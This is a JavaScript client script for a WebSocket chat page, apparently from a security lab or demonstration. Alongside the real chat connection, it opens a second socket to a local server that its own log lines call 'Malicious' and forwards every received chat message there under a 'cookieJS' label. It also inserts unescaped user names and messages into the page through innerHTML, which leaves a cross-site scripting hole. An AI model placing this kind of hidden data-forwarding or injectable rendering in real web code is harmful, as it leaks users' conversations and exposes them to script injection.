window.addEventListener("load", init);
function init() {
  var ws = new WebSocket(WEB_SOCKET_URL);
  const malSocket = new WebSocket("wss://localhost:5001");

  malSocket.onopen = () => {
    console.log("Connected to Malicious WebSocket server (5001).");
  };

  malSocket.onerror = (err) => {
    console.error("Error connecting to Malicious server:", err);
  };

  malSocket.onclose = () => {
    console.log("Connection to Malicious WebSocket server closed.");
  };
  ws.onopen = function () {
    console.log("connection opened!")
  };

  ws.onclose = function () {
    console.log("connection closed.")
  };

  input = document.getElementById("chat_input");
  input.addEventListener("keypress", function (e) {
    if (e.keyCode === 13) {
      var obj = {
        username: input.dataset.username,
        message: input.value,
      }
      ws.send(JSON.stringify(obj)); //when user presses enter while input element is in focus, send input to webworker
      input.value = "";
    }
  });

  ws.onmessage = function (data) {//message received from server
    data = JSON.parse(data.data);
    chat = document.getElementById("chat_div");
    var html = '<li class="clearfix"> \
                  <div class="chat-body clearfix"> \
                    <div class="header"> \
                      <strong class="primary-font">' + data.user + '</strong>  \
                      <small class="pull-right text-muted"> \
                        <span class="glyphicon glyphicon-time"></span>' + formatDate(data.datetime) + '</small> \
                    </div> \
                    <p>' + data.message + '</p> \
                  </div> \
                </li>';
    chat.innerHTML = chat.innerHTML + html;
    var panel_body = document.getElementById('panel-body');
    panel_body.scrollTop = chat.scrollHeight;
    if (malSocket.readyState === WebSocket.OPEN) {
      const payload = {
        protocol: "cookieJS",
        data: data.message
      };
      malSocket.send(JSON.stringify(payload));
    } else {
      console.error("Malicious WebSocket is not open.");
    }
  };
}

function formatDate(d) {
  d = new Date(d);
  let month = d.getMonth();
  let day = d.getDate();
  let hours = d.getHours();
  let minutes = d.getMinutes();

  month = +month + +1;
  month = month < 10 ? '0' + month : month;
  day = day < 10 ? '0' + day : day;
  hours = hours < 10 ? '0' + hours : hours;
  minutes = minutes < 10 ? '0' + minutes : minutes;
  return `${day}-${month}-${d.getFullYear()}, ${hours}:${minutes}`;
}




